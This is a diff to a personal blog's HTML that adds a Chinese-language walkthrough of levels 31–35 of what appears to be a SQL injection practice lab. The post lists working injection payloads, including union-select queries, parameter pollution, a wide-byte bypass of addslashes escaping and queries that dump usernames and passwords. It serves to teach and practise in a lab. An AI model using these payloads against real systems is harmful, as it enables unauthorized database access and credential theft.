@@ -248,6 +248,63 @@
 
 
   
+    <article id="post-sql-31-35关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/12/20/sql-31-35%E5%85%B3/" class="article-date">
+  <time class="dt-published" datetime="2022-12-20T15:32:14.000Z" itemprop="datePublished">2022-12-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/12/20/sql-31-35%E5%85%B3/">sql 31-35关</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>sql第三十一关</p>
+<p>1.闭合方式：”)</p>
+<p>2.?id&#x3D;-1”)union select 1,2,database() –+  </p>
+<p>3.?id&#x3D;1&amp;id&#x3D;0”) union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23  区分大小写用%23闭合</p>
+<p>4.接下来的语句没区别</p>
+<p>sql第三十二关</p>
+<p>1.这关是宽字节绕过引号转义，addslashes()会在单引号前加一个\ 例如：I’m hacker 传入addslashes()，得到：I&#39;m hacker，本题想以此阻止sql注入语句闭合，但是可以使用宽字节绕过：原理大概来说就是，一个双字节组成的字符，比如一个汉字‘我’的utf8编码为%E6%88%91 当我们使用?id&#x3D;-1%E6’ 这样的构造时，’ 前面加的 \ 就会和%E6 合在一起，但是又不是一个正常汉字，但是起到了注掉 \ 的作用。</p>
+<p>2.?id&#x3D;-1%E6’ union select 1,version(),database() –+</p>
+<p>3.在爆列的时候我们要用到‘user’，有单引号，我们用十六进制编码替代，users 使用十六进制编码得到7573657273，构造为0x7573657273，获取列名，?id&#x3D;-1%E6’ union select 1,version(),group_concat(column_name) from information_schema.columns where table_name &#x3D;0x7573657273–+</p>
+<p>4.获得用户名密码，?id&#x3D;-1%E6’ union select 1,2,group_concat(username,0x3b,password) from users–+</p>
+<p>sql第三十三关</p>
+<p>1.与三十二关一致</p>
+<p>sql第三十四关</p>
+<p>1.变成post方式了，其它与前两关一致， uname&#x3D;admin%99’ union select version(),database()–+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p>
+<p>2.uname&#x3D;admin%99’  union select 1,group_concat(username,0x3b,password) from users#&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit(注意这关uname好像只有两个显示位)</p>
+<p>3.略</p>
+<p>sql第三十五关</p>
+<p>1.数字型，直接注入，?id&#x3D;-1 union select 1,version(),database()–+</p>
+<p>2.?id&#x3D;-1 union select 1,2,group_concat(username,0x3b,password) from users#  （其他的语句参考第一关）</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/12/20/sql-31-35%E5%85%B3/" data-id="clgcfnjt30000qsxxb64rc5zj" data-title="sql 31-35关" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-sql-21-25关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/12/18/sql-21-25%E5%85%B3/" class="article-date">
@@ -621,11 +678,11 @@
           </li>
         
           <li>
-            <a href="/2022/12/18/sql-21-25%E5%85%B3/">sql 21-25关</a>
+            <a href="/2022/12/20/sql-31-35%E5%85%B3/">sql 31-35关</a>
           </li>
         
           <li>
-            <a href="/2022/12/17/sql-16-20%E5%85%B3/">sql 16-20关</a>
+            <a href="/2022/12/18/sql-21-25%E5%85%B3/">sql 21-25关</a>
           </li>
         
       </ul>
